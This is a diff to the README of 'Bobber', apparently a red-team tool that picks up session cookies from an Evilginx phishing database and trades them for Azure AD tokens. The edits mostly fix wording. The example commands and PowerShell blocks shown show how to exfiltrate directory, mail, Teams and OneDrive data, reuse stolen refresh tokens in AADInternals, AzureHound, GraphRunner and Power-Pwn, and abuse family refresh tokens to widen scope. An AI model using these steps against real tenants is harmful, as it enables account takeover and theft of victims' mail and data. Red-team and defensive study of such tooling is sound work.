@@ -31,7 +31,7 @@ Bobber accepts a number of input arguments to adjust the RoadTools interactive a
 Checkout the TrustedSec Blogpost [The Triforce of Initial Access](https://www.trustedsec.com), for more information 
 
 ```
-usage: Bobber.py [-h] [--host HOST] [--port PORT] [--username USERNAME] [--password PASSWORD] [--key KEY] [--user-key USER_KEY] [--api-token API_TOKEN] [--all] [--aad] [--teams]
+usage: bobber.py [-h] [--host HOST] [--port PORT] [--username USERNAME] [--password PASSWORD] [--key KEY] [--user-key USER_KEY] [--api-token API_TOKEN] [--all] [--aad] [--teams]
                  [--onedrive] [--owa] [--owa-limit OWA_LIMIT] [-c CLIENT] [-r RESOURCE] [-s SCOPE] [-ru URL] [-t TENANT] [-d DRIVER_PATH] [-k]
                  database_path
 
@@ -95,67 +95,67 @@ RoadTools Options:
 
 # Example Usage
 
-Monitor a remote file for changes via SSH, authenticate using your default ssh key (~/.ssh/id_rsa), keep the browser session open after RoadTools has exchange captured cookie for JWT tokens, and exfiltrate only AAD Users and Groups data from the Graph API
+Monitor a remote file for changes via SSH, authenticate using your default ssh key (~/.ssh/id_rsa), keep the browser session open after RoadTools has exchanged captured cookie for JWT tokens, and exfiltrate only AAD Users and Groups data from the Graph API
 ```powershell
-python Bobber.py "/root/.evilginx/data.db" --username root --host 1337.66.69.420 --keep-open --aad
+python bobber.py "/root/.evilginx/data.db" --username root --host 1337.66.69.420 --keep-open --aad
 ```
 
-Monitor a local file for changes, exchange captured cookie for JWT token, and exfiltrate only emails.
+Monitor a local file for changes, exchange captured cookies for JWT token, and exfiltrate only emails.
 ```powershell
-python Bobber.py evilginx_data.db --host 1337.66.69.420  --owa 
+python bobber.py evilginx_data.db --host 1337.66.69.420  --owa 
 ```
 
-Monitor a remote file for changes over SSH. authenticate using username and password, exchange captured cookie for JWT tokens, and exfiltrate all data available.
+Monitor a remote file for changes over SSH, authenticate using username and password, exchange captured cookies for JWT tokens, and exfiltrate all data available.
 ```powershell
-python Bobber.py "/root/.evilginx/data.db" --username root --password 'MySuperPass123!' --all
+python bobber.py "/root/.evilginx/data.db" --username root --password 'MySuperPass123!' --all
 ```
 
 
 # Usage with other tools
-When Bobber captures a complete Evilginx session, then tokens retrieved using RoadTools will be stored in a file using the following naming convention `.sanitized_email_roadtools_auth`. This file can be used in combination with many other tools besides TeamFiltration. Here are a few examples from the context of a PowerShell prompt.
+When Bobber captures a complete Evilginx session, tokens retrieved using RoadTools will be stored in a file using the following naming convention `.sanitized_email_roadtools_auth`. This file can be used in combination with many other tools besides TeamFiltration. Here are a few examples from the context of a PowerShell prompt.
 
 ### AADInternals
 [AADInternals](https://aadinternals.com/aadinternals/#introduction) is an Modular powershell-framework for exploring the pathways your access might have, created by my favorite finnish person [@DrAzureAD](https://twitter.com/DrAzureAD)
 
 ```powershell
-#Read and parse RoadTools auth file into a JSON object
+#Read and parse the RoadTools auth file into a JSON object
 $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
-#Add the token information from RoadTools to cache so it will be used for auth
+#Add the token information from RoadTools to the cache so it will be used for auth
 Add-AADIntAccessTokenToCache -AccessToken $roadToolsAuth.accessToken -RefreshToken $roadToolsAuth.refreshToken
 
 #Read Teams messages from the GraphAPI
 Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName
 
-# Send a Teams message to an an user, using the GraphAPI
+# Send a Teams message to an a user using the GraphAPI
 Send-AADIntTeamsMessage -Recipients "bruce.wayne@example.com" -Message "Hello there, BATMAN!"
 
-#Abuse [Family Refresh Tokens](https://github.com/secureworks/family-of-client-ids-research#abusing-family-refresh-tokens-for-unauthorized-access-and-persistence-in-azure-active-directory) to refresh as the the "Microsoft Azure PowerShell" Application (1950a258-227b-4e31-a9cf-717495945fc2). Obtains an access-token with different scope.
+#Abuse [Family Refresh Tokens](https://github.com/secureworks/family-of-client-ids-research#abusing-family-refresh-tokens-for-unauthorized-access-and-persistence-in-azure-active-directory) to refresh as the the "Microsoft Azure PowerShell" Application (1950a258-227b-4e31-a9cf-717495945fc2). Obtains an access token with a different scope.
 $msAzJWT =Get-AADIntAccessTokenWithRefreshToken -ClientId "1950a258-227b-4e31-a9cf-717495945fc2" -Resource "https://graph.microsoft.com" -TenantId $roadToolsAuth.tenantId -RefreshToken $roadToolsAuth.refreshToken -SaveToCache 1 -IncludeRefreshToken 1
 ```
 
 ### AzureHound
-[AzureHound](https://github.com/BloodHoundAD/AzureHound) is an BloodHound data collector for Microsoft Azure, from the great people over at [@SpecterOps](https://twitter.com/SpecterOps)
+[AzureHound](https://github.com/BloodHoundAD/AzureHound) is a BloodHound data collector for Microsoft Azure, from the great people over at [@SpecterOps](https://twitter.com/SpecterOps)
 
 ```powershell
 #Read and parse RoadTools auth file into a JSON object
 $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
-#Use the refresh token and tenantId in order to run AzureHound against the tenant
+#Use the refresh token and tenantId to run AzureHound against the tenant
 ./azurehound.exe -r $roadToolsAuth.refreshToken -t $roadToolsAuth.tenantId list -o output.json
 ```
 
 ### GraphRunner
-[GraphRunner](https://github.com/dafthack/GraphRunner) Powershell based post-exploitation toolset for interacting with the Microsoft Graph API, by [@dafthack](https://twitter.com/dafthack)
+[GraphRunner](https://github.com/dafthack/GraphRunner) Powershell-based post-exploitation toolset for interacting with the Microsoft Graph API, by [@dafthack](https://twitter.com/dafthack)
 ```powershell
 #Import GraphRunner
 Import-Module .\GraphRunner.ps1
 
 #Read and parse RoadTools auth file into a JSON object
-#While the JSON object of roadtools does not match what GraphRunner needs,enought objects match in order to "trick" GraphRunner into allowing us to run RefreshGraphTokens
+#While the JSON object of roadtools does not match what GraphRunner needs, enough properties match to "trick" GraphRunner into allowing us to run RefreshGraphTokens
 $tokens = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
-#Run RefreshGraphTokens in order to update our $tokens var 
+#Run RefreshGraphTokens to update our $tokens var 
 Invoke-RefreshGraphTokens -RefreshToken $roadToolsAuth.refreshToken -tenantid $roadToolsAuth.tenantId
 
 #Most common command to dump a series of information from the Graph API
@@ -164,7 +164,7 @@ Invoke-GraphRunner -Tokens $tokens
 
 
 ### Power-Pwn
-[Power-Pwn](https://github.com/mbrg/power-pwn) in Python based offensive security toolset for targeting the Microsoft 365 Power Platform, by [@mbrg0](https://twitter.com/mbrg0)
+[Power-Pwn](https://github.com/mbrg/power-pwn) in Python-based offensive security toolset for targeting the Microsoft 365 Power Platform, by [@mbrg0](https://twitter.com/mbrg0)
 ```powershell
 #Read and parse RoadTools auth file into a JSON object
 $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
@@ -180,9 +180,10 @@ $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -ra
 ```
 
 # Todo
+- [ ] Add an option to specify a proxy URL for token retrieval and exfiltration
 - [ ] Allow for capture and notification for other username + password + cookie combinations (then only O365)
 - [ ] Options to get Pushover notifications even if only username + password was captured (no cookie)
 
 # Credits
 - [@_dirkjan](https://twitter.com/_dirkjan) for the amazing work that is [RoadTools](https://github.com/dirkjanm/ROADtools) 
-- [mrgretzky](https://twitter.com/mrgretzky) for the raising the standard of phishing simulation with the [evilginx2](https://github.com/kgretzky/evilginx2) toolkit
+- [mrgretzky](https://twitter.com/mrgretzky) for raising the standard of phishing simulation with the [evilginx2](https://github.com/kgretzky/evilginx2) toolkit
